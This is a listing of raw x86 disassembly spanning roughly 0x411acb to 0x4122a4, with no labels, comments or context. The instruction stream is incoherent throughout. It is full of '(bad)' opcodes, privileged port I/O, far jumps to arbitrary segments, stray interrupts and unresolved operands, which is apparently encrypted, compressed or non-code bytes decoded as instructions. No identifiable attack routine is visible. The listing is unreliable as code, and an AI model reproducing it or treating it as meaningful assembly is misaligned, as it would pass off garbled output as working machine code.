  411acb:	ror    ch,cl
  411acd:	ins    DWORD PTR es:[edi],dx
  411ace:	js     0x411ac6
  411ad0:	xlat   BYTE PTR ds:[ebx]
  411ad1:	pusha  
  411ad2:	jb     0x411b22
  411ad4:	xor    al,BYTE PTR [edi+0x54b86b2a]
  411ada:	cmp    dl,BYTE PTR ds:0x80b3d99d
  411ae0:	and    DWORD PTR [ebx-0x4c],esp
  411ae3:	push   esi
  411ae4:	scas   eax,DWORD PTR es:[edi]
  411ae5:	cmp    BYTE PTR [ecx+0x2d946f0d],bl
  411aeb:	or     dh,bl
  411aed:	adc    ebx,DWORD PTR [eax*2-0x5f0b6d0b]
  411af4:	stc    
  411af5:	pop    eax
  411af6:	and    BYTE PTR [ebx-0xa],0xc2
  411afa:	mov    ?,edi
  411afc:	inc    edx
  411afd:	sub    eax,esp
  411aff:	loopne 0x411b70
  411b01:	add    DWORD PTR fs:[esi],eax
  411b04:	aad    0x8c
  411b06:	mov    es,WORD PTR [ebp-0x4c187441]
  411b0c:	psubusw mm5,QWORD PTR [ebx+0x7b6a4c1b]
  411b13:	dec    edi
  411b14:	push   ebx
  411b15:	pop    ds
  411b16:	cdq    
  411b17:	cdq    
  411b18:	jae    0x411aa5
  411b1a:	inc    ebx
  411b1b:	nop
  411b1c:	fs or  ebp,0x317d3bf1
  411b23:	jb     0x411b36
  411b25:	pop    ds
  411b26:	ins    DWORD PTR es:[edi],dx
  411b27:	sub    DWORD PTR [esi+0xed237e4],ecx
  411b2d:	mov    bl,0xa4
  411b2f:	test   eax,0xf2f47268
  411b34:	scas   eax,DWORD PTR es:[edi]
  411b35:	leave  
  411b36:	dec    esp
  411b37:	jp     0x411b89
  411b39:	mov    ebx,DWORD PTR [esp+edi*4]
  411b3c:	pop    eax
  411b3d:	(bad)  
  411b3f:	cmp    eax,0x284a1f0c
  411b44:	aas    
  411b45:	sar    ah,cl
  411b47:	bound  ebp,QWORD PTR [ebx+edx*1]
  411b4a:	cmp    BYTE PTR [eax-0x44cf1c3d],0x1a
  411b51:	jmp    0x1b97:0x8006f97d
  411b58:	or     al,0xf8
  411b5a:	test   al,0x9c
  411b5c:	xchg   esi,eax
  411b5d:	add    bl,BYTE PTR [esi+0x14]
  411b60:	aaa    
  411b61:	inc    esp
  411b62:	push   edx
  411b63:	imul   eax,esp,0xffffff90
  411b66:	lock inc eax
  411b68:	jp     0x411bc0
  411b6a:	mov    bl,0xc2
  411b6c:	ss out dx,eax
  411b6e:	sub    eax,edx
  411b70:	and    BYTE PTR [ecx],bh
  411b72:	mov    bh,BYTE PTR [eax+0x37]
  411b75:	cmp    DWORD PTR [esi-0x69442fb2],eax
  411b7b:	iret   
  411b7c:	jae    0x411bad
  411b7e:	inc    ebp
  411b7f:	js     0x411bd0
  411b81:	std    
  411b82:	out    0x69,eax
  411b84:	pop    eax
  411b85:	ret    0xb100
  411b88:	or     esp,ebx
  411b8a:	pop    esi
  411b8b:	paddsb mm0,mm7
  411b8e:	repnz push edx
  411b90:	scas   eax,DWORD PTR es:[edi]
  411b91:	(bad)  
  411b92:	cmp    esi,DWORD PTR [edx]
  411b94:	mov    bh,BYTE PTR [eax+0x5401106b]
  411b9a:	enter  0x9e5c,0x82
  411b9e:	pusha  
  411b9f:	pushf  
  411ba0:	mov    esi,0xe1908644
  411ba5:	popa   
  411ba6:	call   0x10dc1640
  411bab:	std    
  411bac:	arpl   WORD PTR ds:0x85b7af71,bx
  411bb2:	int    0x18
  411bb4:	jnp    0x411b81
  411bb6:	mov    ah,0xa0
  411bb8:	loop   0x411ba2
  411bba:	imul   edx,eax,0xffffffc8
  411bbd:	push   0xca32625b
  411bc2:	fwait
  411bc3:	mov    al,0x4d
  411bc5:	push   eax
  411bc6:	ss (bad) 
  411bc8:	hlt    
  411bc9:	dec    ebx
  411bca:	(bad)  
  411bcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bcc:	push   eax
  411bcd:	inc    esi
  411bce:	pop    ss
  411bcf:	adc    eax,0xa1327ae2
  411bd4:	adc    eax,0x54bfa1ad
  411bd9:	mov    edx,0x7f41a7eb
  411bde:	and    BYTE PTR [ebx],al
  411be0:	pop    ss
  411be1:	jmp    0x949ae816
  411be6:	ss stos DWORD PTR es:[edi],eax
  411be8:	arpl   WORD PTR [esi+0xb],dx
  411beb:	pusha  
  411bec:	and    al,0x2
  411bee:	in     al,0x43
  411bf0:	dec    eax
  411bf1:	mov    WORD PTR [eax-0x8],?
  411bf4:	add    edi,0x322ec931
  411bfa:	jne    0x411c56
  411bfc:	adc    eax,0x296a876c
  411c01:	mov    ebp,0xa49e275e
  411c06:	outs   dx,DWORD PTR ds:[esi]
  411c07:	shl    DWORD PTR [edx+0x357d61f2],cl
  411c0d:	aam    0x27
  411c0f:	mov    WORD PTR [edi-0x5200d16a],?
  411c15:	inc    ebx
  411c16:	or     esp,esi
  411c18:	mov    WORD PTR [esi+eax*1-0x3f],ss
  411c1c:	retf   
  411c1d:	mov    WORD PTR [ebp+0x10f03aa0],es
  411c23:	addr16 dec ebx
  411c25:	dec    eax
  411c26:	nop
  411c27:	xor    al,0xc3
  411c29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c2a:	jmp    0x411ca4
  411c2c:	xor    ecx,DWORD PTR [edx]
  411c2e:	or     DWORD PTR [ebp+eiz*2+0x19],esp
  411c32:	mov    eax,0x9a8adc4d
  411c37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c38:	int    0x8e
  411c3a:	lods   eax,DWORD PTR ds:[esi]
  411c3b:	mov    ah,0xb4
  411c3d:	out    dx,eax
  411c3e:	adc    eax,0xa301998a
  411c43:	mov    esp,0x9366bad5
  411c48:	stc    
  411c49:	sbb    BYTE PTR [eax+edx*1-0x50],al
  411c4d:	and    al,0x42
  411c4f:	sbb    DWORD PTR [esi],esi
  411c51:	push   ss
  411c52:	xchg   ebp,eax
  411c53:	stos   WORD PTR es:[edi],ax
  411c55:	inc    ebp
  411c56:	xor    BYTE PTR [ebp+0x13d8d47c],0xb5
  411c5d:	xchg   esp,eax
  411c5e:	cmp    BYTE PTR [edi-0x3],bl
  411c61:	adc    BYTE PTR [esp+eiz*8+0x3c],ch
  411c65:	xor    DWORD PTR [edx+0x5ede4ff4],ebx
  411c6b:	mov    ch,ch
  411c6d:	shl    BYTE PTR [eax],cl
  411c6f:	daa    
  411c70:	retf   
  411c71:	inc    eax
  411c72:	(bad)  
  411c73:	jnp    0x411cc6
  411c75:	push   edx
  411c76:	les    edx,FWORD PTR [esi]
  411c78:	add    BYTE PTR [ebp+0x2b],0x45
  411c7c:	jle    0x411c0a
  411c7e:	mov    bl,0x10
  411c80:	in     al,dx
  411c81:	cdq    
  411c82:	push   0xffffffe3
  411c84:	pop    ecx
  411c85:	call   0x8b5ef5e1
  411c8a:	inc    ebx
  411c8b:	jmp    0xe028:0xdf6467fc
  411c92:	fs mov esp,0x8a6e7011
  411c98:	mov    al,ds:0x7b264666
  411c9d:	lods   al,BYTE PTR ds:[esi]
  411c9e:	cmp    esi,DWORD PTR [ecx]
  411ca0:	dec    esp
  411ca1:	cmp    BYTE PTR [ebp+0x5a],dl
  411ca4:	adc    bh,BYTE PTR [ebx]
  411ca6:	call   0x7d96a349
  411cab:	std    
  411cac:	es jmp 0xff63:0x8c55f800
  411cb4:	jno    0x411c3c
  411cb6:	loop   0x411cb3
  411cb8:	sub    dh,BYTE PTR [ebx-0x60]
  411cbb:	popa   
  411cbc:	sub    BYTE PTR [edx-0x4baaadef],ah
  411cc2:	fist   DWORD PTR [edx-0xe]
  411cc5:	and    eax,0x243ceed5
  411cca:	mov    ah,0x4d
  411ccc:	enter  0xfdcf,0x24
  411cd0:	sar    ch,1
  411cd2:	outs   dx,BYTE PTR ds:[esi]
  411cd3:	mov    ecx,0xd4112bf3
  411cd8:	data16 test BYTE PTR [eax+0x5f],al
  411cdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cdd:	mov    ss,edx
  411cdf:	dec    ebx
  411ce0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ce1:	(bad)  
  411ce2:	mov    eax,0xe765724a
  411ce7:	test   BYTE PTR [edi-0x8fa1ba3],al
  411ced:	sub    BYTE PTR [edx+0x2b0f52b3],bh
  411cf3:	clc    
  411cf4:	jnp    0x411d01
  411cf6:	mov    DWORD PTR [eax-0x746b564a],esp
  411cfc:	inc    edx
  411cfd:	aaa    
  411cfe:	cmovbe eax,DWORD PTR [eax-0x6b]
  411d02:	out    0xca,al
  411d04:	scas   al,BYTE PTR es:[edi]
  411d05:	xchg   ebp,eax
  411d06:	pop    ebx
  411d07:	test   eax,0xbf83740a
  411d0c:	icebp  
  411d0d:	retf   0x4d14
  411d10:	dec    ebx
  411d11:	and    eax,0x84655df
  411d16:	imul   esp,edi,0xffffffe1
  411d19:	call   0x9404:0xd94ec45b
  411d20:	addr16 jno 0x411d49
  411d23:	std    
  411d24:	inc    ebp
  411d25:	call   0xd28b:0xb87ea028
  411d2c:	lods   al,BYTE PTR ds:[esi]
  411d2d:	mov    edx,0x4dadf600
  411d32:	scas   eax,DWORD PTR es:[edi]
  411d33:	adc    bl,BYTE PTR [edi]
  411d35:	arpl   di,si
  411d37:	test   ecx,0xfa8c3257
  411d3d:	scas   eax,DWORD PTR es:[edi]
  411d3e:	or     al,0x42
  411d40:	adc    dh,BYTE PTR [edi+esi*4]
  411d43:	mov    dl,0x6a
  411d45:	pop    edx
  411d46:	pop    edx
  411d47:	jae    0x411cf2
  411d49:	pop    ebp
  411d4a:	aaa    
  411d4b:	cmp    eax,DWORD PTR [edx]
  411d4d:	mov    ebx,0x8da77763
  411d52:	mov    eax,0xe020c53c
  411d57:	pop    ebx
  411d58:	and    DWORD PTR [ebx+0x3b9726f4],edi
  411d5e:	cmp    eax,0x16e99d54
  411d63:	xchg   edi,eax
  411d64:	test   BYTE PTR [ebp-0x59],bh
  411d67:	add    dh,bh
  411d69:	dec    edi
  411d6a:	xor    eax,0x6363e744
  411d6f:	addr16 std 
  411d71:	retf   0x7f84
  411d74:	lea    ebx,[edi]
  411d76:	daa    
  411d77:	push   ds
  411d78:	lock jecxz 0x411de8
  411d7b:	cwde   
  411d7c:	sbb    bl,bh
  411d7e:	out    0xc8,al
  411d80:	in     eax,dx
  411d81:	mov    dl,0x79
  411d83:	es stos DWORD PTR es:[edi],eax
  411d85:	fwait
  411d86:	inc    esi
  411d87:	inc    edi
  411d88:	mov    DWORD PTR [edi-0x5],eax
  411d8b:	inc    eax
  411d8c:	int    0xdc
  411d8e:	test   eax,0x126c9b85
  411d93:	jne    0x411d43
  411d95:	std    
  411d96:	int    0x0
  411d98:	dec    edi
  411d99:	clc    
  411d9a:	iret   
  411d9b:	jne    0x411dae
  411d9d:	push   eax
  411d9e:	cs leave 
  411da0:	xchg   ebp,eax
  411da1:	jb     0x411e0e
  411da3:	add    BYTE PTR [ebx],cl
  411da5:	dec    ecx
  411da6:	jb     0x411dac
  411da8:	fstp   TBYTE PTR ds:0x4fed75aa
  411dae:	adc    BYTE PTR [eiz*8-0xd9ef5fa],cl
  411db5:	mov    ebx,0xca339318
  411dba:	or     al,0xd0
  411dbc:	add    BYTE PTR [edi],dh
  411dbe:	mov    edx,DWORD PTR [ebp+0x2]
  411dc1:	(bad)  
  411dc2:	mov    ebx,0x9e4e0348
  411dc7:	cmp    eax,0xb2e1cd9c
  411dcc:	jge    0x411e09
  411dce:	pop    esi
  411dcf:	jl     0x411daa
  411dd1:	imul   esi,DWORD PTR [edx],0x28
  411dd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411dd5:	xor    eax,0xa4adf5c
  411dda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ddb:	sbb    DWORD PTR [ebx],0x60b99eb3
  411de1:	adc    al,0xe
  411de3:	dec    edi
  411de4:	add    BYTE PTR fs:[ecx+0x7e8e26be],dh
  411deb:	fnstcw WORD PTR [ebp+ebp*2-0x60]
  411def:	jns    0x411dac
  411df1:	arpl   WORD PTR [ecx-0x43b71ca],ax
  411df7:	outs   dx,DWORD PTR ds:[esi]
  411df8:	push   ds
  411df9:	xor    esi,DWORD PTR [ecx+ebx*8+0x54158b2b]
  411e00:	popf   
  411e01:	adc    al,0xae
  411e03:	std    
  411e04:	out    dx,eax
  411e05:	(bad)  
  411e06:	aad    0x2e
  411e08:	outs   dx,DWORD PTR ds:[esi]
  411e09:	dec    ebx
  411e0a:	mov    ds:0xa37b5356,eax
  411e0f:	xchg   edx,eax
  411e10:	cld    
  411e11:	aaa    
  411e12:	dec    eax
  411e13:	sbb    eax,0xac63bf1a
  411e18:	and    eax,0x469b16e2
  411e1d:	ja     0x411e67
  411e1f:	or     DWORD PTR [ebx-0x4578fbfa],esp
  411e25:	add    ecx,edx
  411e27:	add    eax,0xdf08acf6
  411e2c:	stos   BYTE PTR es:[edi],al
  411e2d:	mov    edi,0x9580c0ab
  411e32:	mov    al,0x26
  411e34:	adc    DWORD PTR [ebx],ecx
  411e36:	fwait
  411e37:	stos   DWORD PTR es:[edi],eax
  411e38:	ins    BYTE PTR es:[edi],dx
  411e39:	sub    al,0x7
  411e3b:	cwde   
  411e3c:	dec    esi
  411e3d:	stos   DWORD PTR es:[edi],eax
  411e3e:	lea    ecx,[esi+0x2e]
  411e41:	push   esi
  411e42:	pop    esp
  411e43:	cmp    dh,BYTE PTR ds:0x2392fb92
  411e49:	dec    ecx
  411e4a:	dec    ebx
  411e4b:	or     eax,0x34340f82
  411e50:	in     eax,dx
  411e51:	pop    ebx
  411e52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e54:	sahf   
  411e55:	out    0x89,eax
  411e57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e58:	cli    
  411e59:	ss pop ds
  411e5b:	xor    ecx,ebp
  411e5d:	jb     0x411ed7
  411e5f:	sbb    ecx,ecx
  411e61:	mov    eax,0xb0045c5
  411e66:	add    al,0x3f
  411e68:	sbb    ch,BYTE PTR [eax*4+0x5ac87176]
  411e6f:	jmp    0x9e19:0x611939a4
  411e76:	mov    ds:0xc068d87d,eax
  411e7b:	dec    esp
  411e7c:	cmp    eax,DWORD PTR [edx]
  411e7e:	pop    ss
  411e7f:	adc    eax,0xd72021fc
  411e84:	int    0x71
  411e86:	jbe    0x411ede
  411e88:	out    dx,al
  411e89:	xchg   edx,eax
  411e8a:	fucomip st,st(0)
  411e8c:	inc    edx
  411e8d:	or     DWORD PTR [edx+0x223f5153],esi
  411e93:	xchg   DWORD PTR [esp+edi*4+0x7123a69f],edx
  411e9a:	mov    esi,0x85dec393
  411e9f:	mov    edx,0xc4dec504
  411ea4:	fdiv   QWORD PTR [edi]
  411ea6:	mov    ch,0x1d
  411ea8:	ins    DWORD PTR es:[edi],dx
  411ea9:	(bad)  [edi]
  411eab:	jge    0x411e46
  411ead:	mov    eax,ds:0x503ad557
  411eb2:	outs   dx,DWORD PTR ds:[esi]
  411eb3:	lahf   
  411eb4:	mov    al,0x7d
  411eb6:	xor    BYTE PTR [edi],cl
  411eb8:	cli    
  411eb9:	pop    edi
  411eba:	fld    QWORD PTR ds:0x355c4de
  411ec0:	xchg   esp,esp
  411ec2:	jmp    0x42f9536f
  411ec7:	aas    
  411ec8:	dec    eax
  411ec9:	add    ah,ch
  411ecb:	outs   dx,BYTE PTR ds:[esi]
  411ecc:	(bad)  
  411ecd:	sub    ecx,edx
  411ecf:	imul   esp,DWORD PTR [ebp-0x35d91e91],0x70bc37f2
  411ed9:	shl    DWORD PTR [ecx],0xdd
  411edc:	sti    
  411edd:	icebp  
  411ede:	adc    cl,BYTE PTR [edx-0x60d148ea]
  411ee4:	add    eax,0x1a3c83ba
  411ee9:	adc    eax,0xf18bbb1d
  411eee:	rcr    ebp,1
  411ef0:	arpl   WORD PTR [eax+0x7079747],dx
  411ef6:	dec    eax
  411ef7:	dec    ebp
  411ef8:	mov    edx,0x8480e008
  411efd:	sub    eax,0x87aca256
  411f02:	stos   DWORD PTR es:[edi],eax
  411f03:	retf   
  411f04:	cmp    dl,bl
  411f06:	fs xor al,0x26
  411f09:	addr16 test al,0x9f
  411f0c:	shl    eax,0xf
  411f0f:	sub    esp,DWORD PTR [ebx]
  411f11:	xor    ecx,DWORD PTR [esi-0x79a7b849]
  411f17:	aad    0x61
  411f19:	aam    0x1
  411f1b:	pop    ds
  411f1c:	fcmovnbe st,st(7)
  411f1e:	xor    eax,0x204ce29a
  411f23:	pop    ss
  411f24:	mov    edi,0xbac1e684
  411f29:	sti    
  411f2a:	fldcw  WORD PTR [eax-0x4ae07faf]
  411f30:	jle    0x411f72
  411f32:	mov    esp,0xbcde8077
  411f37:	lds    edi,FWORD PTR [ebx]
  411f39:	fst    QWORD PTR [ecx]
  411f3b:	ins    DWORD PTR es:[edi],dx
  411f3c:	pop    ecx
  411f3d:	mov    ch,0xa1
  411f3f:	push   esi
  411f40:	cmp    edx,DWORD PTR [edx-0x5a663040]
  411f46:	pop    ds
  411f47:	fcomip st,st(1)
  411f49:	aam    0xcb
  411f4b:	xchg   esi,eax
  411f4c:	mov    dl,0xc7
  411f4e:	inc    esi
  411f4f:	dec    ecx
  411f50:	jle    0x411f6a
  411f52:	xchg   ebp,eax
  411f53:	in     al,dx
  411f54:	es xchg edi,eax
  411f56:	in     al,dx
  411f57:	imul   ebx,DWORD PTR [esi+0x29b3156c],0x26
  411f5e:	scas   al,BYTE PTR es:[edi]
  411f5f:	popa   
  411f60:	mov    ecx,0x4a9b8dab
  411f65:	in     eax,0x38
  411f67:	push   ecx
  411f68:	stc    
  411f69:	repz in al,0x1c
  411f6c:	in     eax,0x81
  411f6e:	mov    esp,0x6305af62
  411f73:	stc    
  411f74:	jge    0x411fb1
  411f76:	xchg   ebp,eax
  411f77:	cmp    eax,0x29adbc5b
  411f7c:	mov    ebp,0xcb75694
  411f81:	xor    BYTE PTR [ebx+0x6a],dh
  411f84:	hlt    
  411f85:	ficomp DWORD PTR [ebx+0x18]
  411f88:	jmp    0x4ef9:0xf42cd49b
  411f8f:	pop    ebx
  411f90:	xor    eax,0xcef04370
  411f95:	fadd   st(5),st
  411f97:	test   DWORD PTR ds:0xd435fb54,esp
  411f9d:	mov    ss,WORD PTR [ecx-0x68ac52d8]
  411fa3:	xchg   DWORD PTR [edx+edi*4],edi
  411fa6:	dec    esi
  411fa7:	icebp  
  411fa8:	xchg   esp,eax
  411fa9:	mov    ecx,0xbbf30775
  411fae:	mov    ch,0x25
  411fb0:	stos   BYTE PTR es:[edi],al
  411fb1:	in     eax,0x8a
  411fb3:	pop    esp
  411fb4:	add    BYTE PTR [bx+0x45],cl
  411fb8:	xchg   ebp,eax
  411fb9:	or     DWORD PTR [ecx+0x67],0xf26d337
  411fc0:	xor    BYTE PTR [eax],0xd
  411fc3:	or     BYTE PTR [eax+0x5],0xd0
  411fc7:	jae    0x411f7f
  411fc9:	cmp    ecx,DWORD PTR [ebp+0x0]
  411fcc:	add    DWORD PTR [ebx],0xdf09b488
  411fd2:	fist   DWORD PTR [edi+0x31b08d6d]
  411fd8:	jno    0x411f6d
  411fda:	add    al,0x90
  411fdc:	mov    esi,0x3eb0d184
  411fe1:	mov    WORD PTR [eax-0x15fe61c7],fs
  411fe7:	adc    esi,DWORD PTR [edx+0x78a9f992]
  411fed:	cmp    al,0xcd
  411fef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ff0:	xor    DWORD PTR [ebx-0x12],edi
  411ff3:	mov    al,ds:0x8c1c6416
  411ff8:	dec    esp
  411ff9:	jmp    0x9c94bd53
  411ffe:	jmp    0x412005
  412000:	pop    edx
  412001:	adc    BYTE PTR [edi-0x3],bl
  412004:	dec    ebx
  412005:	dec    ecx
  412006:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412007:	xchg   DWORD PTR [ebx+ebp*2+0x6d],edi
  41200b:	fcmovb st,st(7)
  41200d:	or     eax,0x2ff71473
  412012:	or     BYTE PTR [edx],ah
  412014:	jmp    0xf308:0xed612551
  41201b:	add    al,0x7d
  41201d:	out    0xe6,al
  41201f:	imul   eax,DWORD PTR [ecx+0x75],0x41066c62
  412026:	inc    ebx
  412027:	out    dx,al
  412028:	xchg   DWORD PTR [esi-0x1d],esp
  41202b:	sahf   
  41202c:	fisub  DWORD PTR [edi-0x3a2fa89a]
  412032:	inc    ebx
  412033:	adc    ch,ah
  412035:	lahf   
  412036:	jnp    0x41209e
  412038:	jge    0x412034
  41203a:	cmp    al,0x97
  41203c:	adc    BYTE PTR [ebp-0x5503ac0c],ch
  412042:	pop    esi
  412043:	stos   DWORD PTR es:[edi],eax
  412044:	ss adc al,BYTE PTR ss:[ecx-0x2f]
  412049:	loope  0x41206c
  41204b:	dec    edx
  41204c:	cmp    al,cl
  41204e:	sahf   
  41204f:	scas   eax,DWORD PTR es:[edi]
  412050:	or     BYTE PTR [edx-0x1a],bl
  412053:	lds    ebp,FWORD PTR [edi+ecx*1]
  412056:	push   eax
  412057:	lea    edi,[ecx]
  412059:	mov    cl,0x54
  41205b:	enter  0x47d4,0x18
  41205f:	stos   DWORD PTR es:[edi],eax
  412060:	aad    0x3c
  412062:	adc    ecx,DWORD PTR [ecx-0x2b]
  412065:	fimul  WORD PTR [ecx]
  412067:	push   ds
  412068:	inc    eax
  412069:	push   es
  41206a:	jmp    0xbf43:0x23510eed
  412071:	(bad)  
  412072:	mov    ds:0xa8340c88,eax
  412077:	cmc    
  412078:	jmp    0xcfffab23
  41207d:	pop    ecx
  41207e:	adc    BYTE PTR [ecx-0x62],cl
  412081:	mov    bh,0x1b
  412083:	mov    bl,0xdd
  412085:	mov    ebp,es
  412087:	sbb    DWORD PTR [ebp+0xbc155c],esi
  41208d:	adc    al,0x9b
  41208f:	(bad)  
  412090:	sbb    eax,0x40ec0412
  412095:	mov    esp,0x10a8d906
  41209a:	pop    eax
  41209b:	scas   al,BYTE PTR es:[edi]
  41209c:	or     DWORD PTR [ebx+edi*2+0xa],0xffffffba
  4120a1:	sub    al,BYTE PTR [ebx+0x4a]
  4120a4:	not    bl
  4120a6:	sub    dh,BYTE PTR ds:0x1591e10d
  4120ac:	lods   eax,DWORD PTR ds:[esi]
  4120ad:	mov    DWORD PTR [ecx+0xc],edx
  4120b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120b1:	(bad)  
  4120b3:	mov    eax,0xdbe9bdc3
  4120b8:	mov    WORD PTR [edx-0x55],fs
  4120bb:	gs jl  0x41204e
  4120be:	enter  0x180f,0x9a
  4120c2:	mov    eax,0xad1b2ada
  4120c7:	mov    WORD PTR [eax+0x5f],gs
  4120ca:	rcr    DWORD PTR [eax+ecx*1+0x5b],cl
  4120ce:	and    eax,0x2564a7d
  4120d3:	dec    ebp
  4120d4:	jle    0x4120aa
  4120d6:	arpl   WORD PTR [edx+0x3],cx
  4120d9:	cmp    eax,0x92f9db86
  4120de:	add    BYTE PTR [ebx+0x37ca0d30],cl
  4120e4:	cmp    esp,DWORD PTR [ecx]
  4120e6:	mov    ebp,0x30c3fbba
  4120eb:	pop    eax
  4120ec:	mov    DWORD PTR [eax+0x2],ebx
  4120ef:	mov    ch,0xdb
  4120f1:	xchg   edx,eax
  4120f2:	sub    eax,ecx
  4120f4:	pop    es
  4120f5:	and    bh,BYTE PTR [ebp+0x85d35a2]
  4120fb:	or     ecx,DWORD PTR [esi]
  4120fd:	jno    0x4120bf
  4120ff:	cmp    BYTE PTR [ecx],cl
  412101:	(bad)  
  412102:	sar    DWORD PTR [ebx+0x7a],cl
  412105:	nop
  412106:	xor    BYTE PTR [edx],0xa0
  412109:	aas    
  41210a:	repnz and bl,BYTE PTR [esi-0x44]
  41210e:	inc    esi
  41210f:	mov    bh,0xc1
  412111:	(bad)  
  412112:	jo     0x412184
  412114:	mov    ebx,0xa594562c
  412119:	mov    al,BYTE PTR [ebp-0x541762f9]
  41211f:	popa   
  412120:	xchg   BYTE PTR [edi+0x25],bh
  412123:	dec    ecx
  412124:	dec    ebp
  412125:	cmp    BYTE PTR [ebp-0x31740102],cl
  41212b:	xor    edi,ebx
  41212d:	ja     0x412194
  41212f:	cmp    edx,ecx
  412131:	ins    DWORD PTR es:[edi],dx
  412132:	shl    DWORD PTR [ebp-0x1e7af093],0x6e
  412139:	dec    ebp
  41213a:	iret   
  41213b:	adc    al,0xd0
  41213d:	jnp    0x4121ae
  41213f:	lea    ecx,[edi-0xb5036fa]
  412145:	jnp    0x4121ba
  412147:	ret    
  412148:	cmp    ch,BYTE PTR [eax+0x42d06aff]
  41214e:	inc    DWORD PTR [edi-0x612b3327]
  412154:	sub    BYTE PTR [edi+esi*1+0x5d],0xdb
  412159:	cmp    eax,0xfe3d4331
  41215e:	push   es
  41215f:	in     al,dx
  412160:	into   
  412161:	add    eax,0xa91794ff
  412166:	imul   edi,DWORD PTR [esp+eax*4+0x1ac134ac],0x9
  41216e:	ins    DWORD PTR es:[edi],dx
  41216f:	in     al,0x3d
  412171:	jl     0x41216b
  412173:	ror    ecx,1
  412175:	cmp    dl,dl
  412177:	xor    BYTE PTR [esi],dl
  412179:	xchg   esp,eax
  41217a:	mov    ebx,0xde1644d6
  41217f:	loopne 0x412143
  412181:	in     eax,dx
  412182:	cli    
  412183:	xchg   BYTE PTR [edx+0x2992e66c],bl
  412189:	xchg   BYTE PTR [esi+ebp*4],ch
  41218c:	outs   dx,DWORD PTR ds:[esi]
  41218d:	jae    0x412120
  41218f:	scas   eax,DWORD PTR es:[edi]
  412190:	clc    
  412191:	cmovns edx,ebx
  412194:	xchg   esp,eax
  412195:	mov    DWORD PTR [edx+eiz*4+0x4],esi
  412199:	jae    0x412161
  41219b:	mov    al,ds:0x9c38cf70
  4121a0:	(bad)  
  4121a1:	cmp    eax,0x931944ee
  4121a6:	inc    eax
  4121a7:	push   0xffffff97
  4121a9:	mov    eax,0xd77e886e
  4121ae:	loope  0x4121fd
  4121b0:	sbb    edx,ecx
  4121b2:	jo     0x4121b6
  4121b4:	clc    
  4121b5:	loope  0x412227
  4121b7:	xchg   BYTE PTR [edi-0x7f],bl
  4121ba:	jb     0x4121c6
  4121bc:	jge    0x412216
  4121be:	shr    DWORD PTR [edx+ebx*8],0xd8
  4121c2:	int    0x9a
  4121c4:	mov    bl,BYTE PTR [edi]
  4121c6:	sahf   
  4121c7:	aad    0xb5
  4121c9:	push   ds
  4121ca:	add    edi,DWORD PTR [eax+0x56]
  4121cd:	or     edx,eax
  4121cf:	xchg   ebx,eax
  4121d0:	mov    edi,0xaa164896
  4121d5:	fnstsw WORD PTR [edi+0x0]
  4121d8:	aaa    
  4121d9:	je     0x41215b
  4121db:	xchg   dl,ah
  4121dd:	dec    ebx
  4121de:	push   esi
  4121df:	xor    DWORD PTR [edx],eax
  4121e1:	adc    eax,0x3a292d77
  4121e6:	mov    ds,WORD PTR [edx]
  4121e8:	jnp    0x41219e
  4121ea:	and    eax,0xb7a9c0ea
  4121ef:	cmp    esi,DWORD PTR [edi+ebp*2-0x9f022f7]
  4121f6:	loopne 0x41222c
  4121f8:	out    0xa6,al
  4121fa:	(bad)  
  4121fb:	arpl   bp,si
  4121fd:	sbb    al,0xe4
  4121ff:	mov    bh,0xf7
  412201:	lahf   
  412202:	stos   BYTE PTR es:[edi],al
  412203:	xchg   ebx,eax
  412204:	cdq    
  412205:	jnp    0x412263
  412207:	fisttp QWORD PTR [edx]
  412209:	dec    esp
  41220a:	sub    al,0xe9
  41220c:	sbb    BYTE PTR ds:0x2849cc49,al
  412212:	xor    cl,BYTE PTR [ebp-0x9]
  412215:	in     al,dx
  412216:	xor    ah,bl
  412218:	arpl   WORD PTR [esi-0x69],si
  41221b:	inc    ecx
  41221c:	dec    ebx
  41221d:	in     al,0x62
  41221f:	pop    ebx
  412220:	push   ss
  412221:	sub    cl,bl
  412223:	xor    edx,DWORD PTR [ecx+0x70]
  412226:	adc    BYTE PTR [ebx-0x34],bh
  412229:	ins    DWORD PTR es:[edi],dx
  41222a:	in     eax,0x8
  41222c:	jbe    0x412234
  41222e:	cmc    
  41222f:	pop    edx
  412230:	int3   
  412231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412232:	call   0x87a7493d
  412237:	les    ebx,FWORD PTR gs:[edx+0x1a4ffe75]
  41223e:	cwde   
  41223f:	mov    eax,ds:0x500dfc1a
  412244:	std    
  412245:	mov    eax,0x482ae038
  41224a:	mov    cl,0xef
  41224c:	(bad)  
  41224d:	fst    QWORD PTR [edi]
  41224f:	sbb    ah,BYTE PTR [edx]
  412251:	js     0x4121fe
  412253:	inc    esp
  412254:	mov    esp,DWORD PTR [esi+eiz*8]
  412257:	retf   0xbf84
  41225a:	rcr    DWORD PTR [edi-0x4f],1
  41225d:	retf   
  41225e:	ret    
  41225f:	jnp    0x4122af
  412261:	cwde   
  412262:	retf   0x5106
  412265:	pop    ds
  412266:	mov    bh,ch
  412268:	sbb    DWORD PTR [ecx+0x1c449aa4],edx
  41226e:	gs jg  0x4122e8
  412271:	dec    ecx
  412272:	sub    DWORD PTR [edi-0x746c79f3],0x959c896b
  41227c:	lods   al,BYTE PTR ds:[esi]
  41227d:	mov    esp,0x89c948d7
  412282:	mov    al,BYTE PTR [ebx+0x328aa704]
  412288:	push   0x3e7a632e
  41228d:	mov    eax,0x3a8c8a81
  412292:	cwde   
  412293:	es addr16 push eax
  412296:	mov    ds:0x4bceb7a0,al
  41229b:	pop    ds
  41229c:	or     DWORD PTR [ecx+ecx*1-0x4f40d295],edi
  4122a3:	push   ebx
  4122a4:	xchg   ebx,eax
